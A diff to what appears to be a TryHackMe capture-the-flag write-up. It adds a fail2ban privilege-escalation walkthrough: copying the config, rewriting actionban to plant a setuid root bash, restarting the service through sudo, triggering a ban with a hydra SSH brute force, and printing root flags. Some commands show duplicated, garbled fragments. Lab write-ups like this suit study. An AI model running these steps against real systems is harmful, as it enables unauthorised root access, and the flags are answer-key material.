@@ -145,6 +145,8 @@ THM{4a6831d5f124b25eefb1e92e0f0da4ca}
 
 ## 5. Escalate Privileges
 
+> [Creating](https://www.revshells.com/) and [upgrading](https://0xffsec.com/handbook/shells/full-tty/) a reverse shell can help here.  
+
 We always start with `sudo -l` when we get access to a user account.
 
 ```bash
@@ -163,3 +165,95 @@ User asterisk may run the following commands on ip-10-201-121-205:
 
 User `asterisk` can run `fail2ban-client` with sudo privileges.
 We can [exploit](https://juggernaut-sec.com/fail2ban-lpe/) that.
+
+```bash
+$ ps -ef | grep -i fail2ban
+ail2ban| grep -i fa
+root         855       1  0 10:51 ?        00:00:05 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+asterisk    3693    2709  0 12:14 pts/1    00:00:00 grep -i fail2ban
+```
+
+`fail2ban-server` is owned by root. Let's check `/etc/fail2ban` for the configuration file.
+
+```bash
+$ ls -l /etc/fail2ban
+total 84
+drwxr-xr-x 2 root root 12288 May 28 12:59 action.d
+-rw-r--r-- 1 root root  3017 Nov  9  2022 fail2ban.conf
+drwxr-xr-x 2 root root  4096 Jul 11  2021 fail2ban.d
+drwxr-xr-x 3 root root 12288 May 28 12:59 filter.d
+-rw-r--r-- 1 root root 25607 Nov  9  2022 jail.conf
+drwxr-xr-x 2 root root  4096 May 28 12:59 jail.d
+-rw-r--r-- 1 root root  1647 Mar 27  2024 jail.local
+-rw-r--r-- 1 root root   645 Nov 23  2020 paths-arch.conf
+-rw-r--r-- 1 root root  2728 Nov  9  2022 paths-common.conf
+-rw-r--r-- 1 root root   627 Nov  9  2022 paths-debian.conf
+-rw-r--r-- 1 root root   738 Nov 23  2020 paths-opensuse.conf
+```
+
+The key thing to note is that we can read everything.
+User `asterisk` can also run all sudo commands with `fail2ban-client` meaning that
+we should have permission to redirect to new configuration files and restart the service.
+Together with the writable configuration file, we have a working exploit.
+
+```bash
+$ cd /etc/fail2ban
+$ grep -R actionban
+...
+action.d/iptables.conf:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+...
+```
+
+This is the configuration file we want, but first we need to recursively copy the fail2ban directory
+somewhere that we can write to.
+
+```bash
+$ cp -r /etc/fail2ban /tmp/fail2ban
+```
+
+Modify this line of `/tmp/fail2ban/action.d/iptables.conf`. 
+
+```bash
+#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+actionban = cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash 
+```
+
+Then restart the service pointing to our modified configuration.
+
+```bash
+sudo fail2ban-client -c /tmp/fail2ban/ -v restart
+```
+
+On the attacker run `hydra` and stop it with `Ctrl-C` after a few seconds.
+
+```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.201.121.205
+```
+
+On the target machine we should now see `rootbash`.
+
+```bash
+/tmp$ ls -l
+total 1240
+drwxr-xr-x 6 asterisk asterisk    4096 Aug 14 12:59 fail2ban
+-rwsr-xr-x 1 root     root     1265648 Aug 14 13:13 rootbash
+```
+
+```bash
+$ /tmp/rootbash -p
+$ python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'etuid(0);os.setgid(0);pty.spawn("/bin/bash");'
+$ id
+uid=0(root) gid=0(root) groups=0(root),1001(asterisk)
+```
+
+## 5. Find the Root Flag
+
+```bash
+$ find / -name root.txt -exec cat {} \; -quit 2>/dev/ null
+THM{33ad5b530e71a172648f424ec23fae60}
+```
+
+## Sources
+
+1. https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/
+2. https://juggernaut-sec.com/fail2ban-lpe/
